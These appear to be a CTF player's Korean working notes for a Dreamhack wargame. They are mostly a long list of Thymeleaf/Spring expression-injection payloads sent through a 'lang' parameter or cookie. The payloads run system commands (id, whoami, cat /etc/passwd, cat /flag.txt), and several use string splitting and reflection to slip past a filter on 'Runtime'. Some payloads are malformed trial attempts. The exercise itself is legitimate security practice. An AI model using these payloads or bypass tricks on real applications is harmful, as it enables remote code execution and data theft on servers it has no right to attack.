__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime')...}__::.x
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

nc host1.dreamhack.games 13459
여기로 들어가서 슛 때려도 괜찮다 그렇긴 한데 역시 웹 상에서 바로 아는 게 제일 편하긴 하다 

/(${T(java.lang.Runtime).getRuntime().exec('calc')})
${T(java.lang.Runtime).getRuntime().exec('calc')}
__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime')...}__::.x
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("whoami")}__::.x
lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x


lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x

$%7B(1).TYPE.forName(%27ja%27+%27va.lang.Runt%27+%27ime%27).getRuntime().exec('cat%20etc/passwd')%7D

/__$%7B(1).TYPE.forName(%27ja%27+%27va.lang.Runt%27+%27ime%27).getRuntime().exec('cat%20etc/passwd')%7D__::x


__$%7B(1).TYPE.forName(%27ja%27+%27va.lang.Runt%27+%27ime%27).getRuntime().exec("id").getInputStream()).next()}__::.x

__$%7B(1).TYPE.forName(%27ja%27+%27va.lang.Runt%27+%27ime%27.getRuntime().exec("whoami")}__::.x
__$%7B(1).TYPE.forName(%27ja%27+%27va.lang.Runt%27+%27ime%27).getRuntime().exec(%22whoami%22)%7D__%3A%3A.x

__${T(java.lang.Runtime).getRuntime().exec("whoami")}__::.x
__${(1).TYPE.forName('ja' 'va.lang.Runt' 'ime').'ge' 'tRuntime()'.exec("whoami")}__::.x
__%24%7B(1).TYPE.forName(%27ja%27+%27va.lang.Runt%27+%27ime%27).%27ge%27+%27tRuntime()%27.exec(%22whoami%22)%7D__%3A%3A.x

다만 아직 우분투로 풀기에는 내가 그만큼 확신을 가지고 있는 건 아니라서 
/?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()%7d__::.x
이런 식으로 페이로드를 구성하면 웹에서 검증할 수 있다 
그 이유는 이 워게임이 lang을 통해서 ssti가 가능하도록 구성되어 있기 때문이다 

/?lang=__%24%7B(1).TYPE.forName(%27ja%27+%27va.lang.Runt%27+%27ime%27).%27ge%27+%27tRuntime()%27.exec(%22whoami%22)%7D__%3A%3A.x

__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime')
__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').'get'+Runtime().exec(%22nc%20host1.dreamhack.games%2013459%22).getInputStream()).next()%7d__::.x
__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').'get'+'Runt'+'ime'().'ex'+'ec'("'who'+'ami'")}__::.x

/?lang=__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').getRuntime().exec('calc')}__::.x
/(__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').getRuntime().exec('calc')}__::.x)
__${T('ja'+'va.lang.Runt'+'ime').getRuntime().exec('calc')}__::.x
__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime')...}__::.x

근데 알고봤더니 그냥 cookie값에다가 넣어주면 바로 바로 알 수 있는 거였다.. ㅇㅅㅇ(쿠키 때문에 ssti가 가능하다는 것은 알고 있었음)
__${7*7}__::.x 이 값도 쿠키에 넣어주면 에러값으로 결과값이 반환됨을 알 수 있다  

__${new java.util.Scanner(T(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').'getR'+'untime().e'+xec("flag").getInputStream()).next()}__::.x
__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').'get'+'Runt'+'ime'().'ex'+'ec'("flag")}__::.x
__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').'get'+'Runt'+'ime'().exec("cat flag")}__::.x


lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x
__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').getRuntime().exec(%22whoami%22)}__::.x
__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').'get'+'Run'+time().exec(%22whoami%22).getInputStream()).next()%7d__::.x
얘에 대한 반응이 격한 거 보니 뭔가 이쪽에 있는 거 같은데 
어쨋든 핵심은 getRuntime()에도 똑같이 적용되는 필터링을 어떻게 우회하느냐 이다...

__%24%7B(1).TYPE.forName(%27ja%27%2B%27va.lang.Runt%27%2B%27ime%27).%27ge%27%2B%27tRuntime()%27.exec(%22%27who%27%2B%27ami%27%22)%7D__%3A%3A.x

확실히 실험 해본 결과 Runtime같이 필터링 되어 있는 값이 들어가면 access denied가 계속 반복된다 
어쨋든 앞에 나와 있는 자바나 런타임 클래스 등은 회피했으니 뒤에 나오는 getRuntime을 어떻게 회피하느냐가 관건이 될 수 밖에 없다..

__%24%7B%27(1).TYPE.forName(%27ja%27%2B%27va.lang.Runt%27%2B%27ime%27).ge%27%2B%27tR%27%2B%27untime().ex%27%2B%27ec(%22whoami%22)%27%7D__%3A%3A.x%0A
__%24%7B%27(1).TYPE.forName(%27ja%27%2B%27va.lang.Runt%27%2B%27ime%27).ge%27%2B%27tR%27%2B%27untime().ex%27%2B%27ec(%22flag%22)%27%7D__%3A%3A.x%0A
__%24%7B(1).TYPE.forName(%27ja%27%2B%27va.lang.Runt%27%2B%27ime%27).%27ge%27%2B%27tRuntime()%27.exec(%22%27who%27%2B%27ami%27%22)%7D__%3A%3A.x

__${T(Void).TYPE.forName(%22ja%22+%22va.util.Scanner%22).getConstructor(T(Void).TYPE.forName(%22ja%22+%22va.io.InputStream%22)).newInstance(T(Void).TYPE.forName(%22jav%22+%22a.lang.Run%22+%22time%22).getMethods()[6].invoke(null).exec(%22cat%20/flag.txt%22).getInputStream()).next()}__::.x

__${T(Void).TYPE.forName("ja" "va.util.Scanner").getConstructor(T(Void).TYPE.forName("ja" "va.io.InputStream")).newInstance(T(Void).TYPE.forName("jav" "a.lang.Run" "time").getMethods()[6].invoke(null).exec("cat /flag.txt").getInputStream()).next()}__::.x  (url decodin한 모습) 
